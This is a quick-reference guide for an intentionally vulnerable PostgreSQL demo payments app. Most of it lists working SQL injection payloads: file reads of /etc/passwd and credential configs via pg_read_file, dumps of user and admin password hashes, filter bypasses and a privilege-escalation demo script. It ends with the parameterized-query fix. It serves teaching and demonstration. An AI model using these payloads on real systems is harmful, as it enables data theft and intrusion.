# 🎯 Quick Reference: PostgreSQL SQL Injection

## 🚨 Two Vulnerable Endpoints

### 1. Status Page - Single Result
- **URL**: `/status?id=<payload>`
- **Returns**: One payment at a time
- **Best for**: File reading, single queries
- **Example**: `?id=1 UNION SELECT ...`

### 2. Search Page - Multiple Results ⭐ NEW!
- **URL**: `/search?q=<payload>`
- **Returns**: Multiple results at once!
- **Best for**: Bulk data extraction, listing tables/columns
- **Example**: `?q=%' UNION SELECT ... WHERE '1'='1`
- **Advantage**: Extract entire tables in one request!

See **docs/SEARCH_PAGE_SQLI.md** for complete search page guide.

---

## ⚠️ Important: PostgreSQL Type Matching

PostgreSQL UNION queries require **exact type matching**!

**Payments table has 7 columns with these types:**
1. `id` - INTEGER
2. `user_id` - INTEGER
3. `recipient` - VARCHAR
4. `amount` - DECIMAL
5. `description` - TEXT
6. `status` - VARCHAR
7. `created_at` - TIMESTAMP

**Template:** `UNION SELECT <int>, <int>, '<string>', 0.00, '<text>', '<string>', CURRENT_TIMESTAMP`

---

## 🚀 Get Started in 30 Seconds

1. **Start the app**: `docker compose up -d`
2. **Open browser**: http://localhost:5000
3. **Login**: `alice` / `password123`
4. **Try Status page**: `?id=1 OR 1=1`
5. **Try Search page**: `?q=%' OR '1'='1`

---

## 🔥 Top 5 File Reading Payloads (Status Page)

### 1. Read Database Config (⭐ HIGHEST VALUE)
```
?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/tmp/dbconf.ini'), 'credentials', CURRENT_TIMESTAMP
```
**Get**: DB passwords, API keys (Stripe, AWS, SendGrid), Redis passwords, JWT secrets!

### 2. Read /etc/passwd (System Users)
```
?id=1 UNION SELECT 1, 2, '/etc/passwd', 0.00, pg_read_file('/etc/passwd'), 'file', CURRENT_TIMESTAMP
```

### 3. Read Application Source Code
```
?id=1 UNION SELECT 1, 2, 'app.py', 0.00, pg_read_file('/app/app.py'), 'source', CURRENT_TIMESTAMP
```

### 4. Read Requirements (Dependencies)
```
?id=1 UNION SELECT 1, 2, 'requirements', 0.00, pg_read_file('/app/requirements.txt'), 'deps', CURRENT_TIMESTAMP
```

### 5. Read Database Init Script
```
?id=1 UNION SELECT 1, 2, 'init_db.sql', 0.00, pg_read_file('/docker-entrypoint-initdb.d/init_db.sql'), 'schema', CURRENT_TIMESTAMP
```

### 6. List Directory Contents (Bonus!)
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/app'), 0.00, 'Application files', 'dir', CURRENT_TIMESTAMP
```

**Result**: Shows all files in /app directory (including dbconf.ini!)

---

## 💎 Top 5 Database Extraction Payloads

### 1. Get PostgreSQL Version
```
?id=1 UNION SELECT 1, 2, version(), 0.00, 'PostgreSQL version info', 'info', CURRENT_TIMESTAMP
```

### 2. List All Tables
```
?id=1 UNION SELECT 1, 2, table_name, 0.00, table_schema, 'table', CURRENT_TIMESTAMP FROM information_schema.tables WHERE table_schema='public'
```

### 3. Extract Admin Credentials
```
?id=1 UNION SELECT id, id, username, 0.00, CONCAT('Email: ', email, ' | Hash: ', password_hash), 'ADMIN', created_at FROM users WHERE is_admin=TRUE
```

### 4. Extract All Users
```
?id=1 UNION SELECT id, id, username, 0.00, CONCAT(email, ' | ', password_hash), is_admin::text, created_at FROM users
```

### 5. Bypass User Filter (See All Payments)
```
?id=1 OR 1=1
```

---

## 🚀 Top 5 Search Page Payloads (Multiple Results!)

### 1. Extract All User Credentials at Once! ⭐
```
/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```
**Returns**: ALL 3 users with password hashes in ONE request!

### 2. Get All Columns for Users Table (No OFFSET!)
```
/search?q=%' UNION SELECT ordinal_position, ordinal_position, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' AND '1'='1
```
**Returns**: All 7 columns displayed as separate "payments"!

### 3. See ALL Payments from ALL Users
```
/search?q=%' UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM payments WHERE '1'='1
```
**Returns**: All 23 payment transactions (bypasses user_id filter)!

### 4. List All Tables at Once
```
/search?q=%' UNION SELECT 1, 2, tablename, 0.00, schemaname, 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname='public' AND '1'='1
```
**Returns**: Multiple rows showing all tables (users, payments, feedback)!

### 5. Bypass Search Filter (Show All Your Payments)
```
/search?q=%' OR '1'='1
```
**Returns**: All your payments without needing to search!

**Key Difference**: Search page returns MULTIPLE rows, making bulk extraction 10x faster! 🎯

---

## 🎬 3-Minute Demo Script

### Demo: File Reading → Credential Theft → Privilege Escalation

**Step 1** (30 sec): Show legitimate use
```
Login as Alice → Status page → ?id=1
Shows: Alice's payment #1
```

**Step 2** (30 sec): Bypass authentication
```
Try: ?id=1 OR 1=1
Shows: ALL of Alice's payments
Explain: Bypassed user_id check
```

**Step 3** (60 sec): Read system file  
```
Try: ?id=1 UNION SELECT 1, 2, '/etc/passwd', 0.00, pg_read_file('/etc/passwd'), 'file', CURRENT_TIMESTAMP
Shows: All system users
Explain: This is PostgreSQL-specific, not possible with SQLite
```

**Step 4** (60 sec): Extract admin credentials
```
Try: ?id=1 UNION SELECT id, id, username, 0.00, CONCAT('Email: ', email, ' | Hash: ', password_hash), 'ADMIN', created_at FROM users WHERE is_admin=TRUE
Shows: admin username, email, and password hash
Explain: Can see all admin accounts
```

**Step 5** (30 sec): Login as admin
```
Logout → Login as admin/admin123 → Access /admin
Shows: Admin panel with user management
Explain: Complete privilege escalation
```

---

## 📊 Why PostgreSQL vs SQLite?

| Feature | SQLite | PostgreSQL |
|---------|--------|------------|
| **File Reading** | ❌ No | ✅ Yes - `pg_read_file()` |
| **Schema Views** | `sqlite_master` | `information_schema` |
| **Version Info** | `sqlite_version()` | `version()` |
| **Type System** | Weak | Strong - requires `::text` casting |
| **Boolean** | 0/1 integers | TRUE/FALSE |
| **Placeholders** | `?` | `%s` |

**Key Takeaway**: PostgreSQL enables **file system access** via SQL injection!

---

## 🛡️ The Fix (Show This at End)

### ❌ Vulnerable Code (Current)
```python
query = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
cursor.execute(query)
```

### ✅ Secure Code
```python
query = "SELECT * FROM payments WHERE user_id = %s AND id = %s"
cursor.execute(query, (current_user.id, payment_id))
```

**Lesson**: **ALWAYS** use parameterized queries!

---

## 🎓 Key Learning Points

1. ✅ SQL injection can read files in PostgreSQL
2. ✅ Different databases have different capabilities
3. ✅ `information_schema` is the professional way to enumerate
4. ✅ Type casting (`::text`) is needed in PostgreSQL
5. ✅ Parameterized queries prevent ALL injection attacks
6. ✅ Never trust user input
7. ✅ Database choice impacts attack surface

---

## 📖 Full Documentation

- **Complete Guide**: `docs/POSTGRES_SQLI_PAYLOADS.md` (400+ lines)
- **Migration Details**: `docs/POSTGRES_MIGRATION.md`
- **Original SQLite**: `docs/SQLI_PAYLOADS.md`
- **All Docs**: `docs/` directory

---

## 🐛 Quick Troubleshooting

**App not loading?**
```bash
docker compose ps  # Check status
docker logs typo-payments-demo  # Check logs
```

**Port in use?**
```bash
lsof -ti:5432 | xargs kill -9  # Kill process on 5432
docker compose up -d  # Restart
```

**Reset everything?**
```bash
docker compose down -v  # Remove volumes
docker compose up --build -d  # Fresh start
```

---

## 🎯 Demo Accounts

- **alice** / `password123` - Regular user
- **bob** / `password123` - Regular user  
- **admin** / `admin123` - Administrator

---

## ⚠️ Reminder

This is an **intentionally vulnerable** application for educational purposes.

**Never** deploy to production!
**Never** test on systems you don't own!

---

**Ready to demonstrate? Start here:** http://localhost:5000 🚀
